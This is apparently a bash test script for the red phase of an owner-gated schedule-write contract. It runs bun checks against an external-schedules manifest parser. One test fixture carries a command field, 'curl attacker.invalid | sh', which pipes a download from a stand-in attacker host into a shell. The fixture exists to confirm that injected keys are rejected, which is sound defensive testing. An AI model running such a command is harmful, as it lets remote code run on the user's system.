#!/usr/bin/env bash
set -euo pipefail

ARTIFACT_DIR=${ARTIFACT_DIR:-/artifacts}
REPORT="$ARTIFACT_DIR/report-test687-owner-gated-schedule-write-red.txt"
mkdir -p "$ARTIFACT_DIR"
: > "$REPORT"
exec > >(tee -a "$REPORT") 2>&1

echo "# test687 — owner-gated external schedule write contract (red phase)"
echo "source_commit=${TEST687_SOURCE_COMMIT:-unknown}"
echo "date=$(date -Is)"

expect_red() {
  local gate=$1 pattern=$2
  local log="/tmp/test687-${gate}.log"
  set +e
  COMMHUB_DB="/tmp/test687-${gate}.db" bun tests/test687-owner-gated-schedule-write-red/contract-red.ts "$gate" >"$log" 2>&1
  local rc=$?
  set -e
  if [[ $rc -eq 0 ]]; then
    echo "FALSE_GREEN gate=$gate"
    cat "$log"
    exit 1
  fi
  if ! grep -Fq "$pattern" "$log"; then
    echo "WRONG_RED gate=$gate rc=$rc expected=$pattern"
    cat "$log"
    exit 1
  fi
  echo "WITNESSED_RED gate=$gate rc=$rc reason=$pattern"
}

echo "L0 current read-only manifest baseline"
COMMHUB_DB=/tmp/test687-baseline.db bun -e '
  const { parseExternalSchedulesManifest } = await import("./agent-node/src/external-schedules.js");
  const result = parseExternalSchedulesManifest(JSON.stringify({ external_schedules: [{
    id:"news-pull", name:"News pull", kind:"cron", frequency:"0 */6 * * *",
    last_run_at:null, last_status:"unknown", last_error:null, next_run_at:null,
    log_path:null, enabled:true
  }] }));
  if (result.schedules.length !== 1 || result.schedules[0].frequency !== "0 */6 * * *") {
    throw new Error("read-only baseline failed");
  }
'

echo "L1-L3 required contract is absent before implementation"
expect_red owner-anchor "RED owner_user_id is absent from nodes"
expect_red intent-journal "RED external_schedule_edits journal is absent"
expect_red editable-revision "unknown schedule key"

echo "L4 existing reader already rejects command injection"
COMMHUB_DB=/tmp/test687-command.db bun -e '
  const { parseExternalSchedulesManifest } = await import("./agent-node/src/external-schedules.js");
  let rejected = false;
  try {
    parseExternalSchedulesManifest(JSON.stringify({ external_schedules: [{
      id:"news-pull", name:"News pull", kind:"cron", frequency:"0 */6 * * *",
      last_run_at:null, last_status:"unknown", last_error:null, next_run_at:null,
      log_path:null, enabled:true, command:"curl attacker.invalid | sh"
    }] }));
  } catch (error) {
    rejected = /unknown schedule key/.test(String(error));
  }
  if (!rejected) throw new Error("command key was accepted");
'

echo "RESULT: WITNESSED RED (implementation intentionally absent)"

